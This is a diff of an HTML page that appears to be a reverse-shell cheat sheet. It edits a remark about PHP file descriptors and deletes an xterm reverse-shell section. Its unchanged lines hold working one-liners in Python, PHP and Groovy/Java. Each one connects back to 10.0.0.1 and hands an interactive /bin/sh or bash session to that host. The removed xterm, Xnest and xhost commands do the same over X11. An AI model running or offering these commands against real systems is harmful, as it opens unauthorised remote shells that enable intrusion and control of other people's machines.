@@ -14,7 +14,7 @@
 <p>This was tested under Linux / Python 2.7:</p>
 <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
 <h3>PHP</h3>
-<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
+<p>This code assumes that the TCP connection uses file descriptor 3. If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
 <pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
 
 <h3>Ruby</h3>
@@ -28,12 +28,3 @@
 <pre>r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
 p.waitFor()</pre>
-
-<p>[Untested submission from anonymous reader]</p>
-<h3>xterm</h3>
-<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
-<pre>xterm -display 10.0.0.1:1</pre>
-<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
-<pre>Xnest :1</pre>
-<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
-<pre>xhost +targetip</pre>
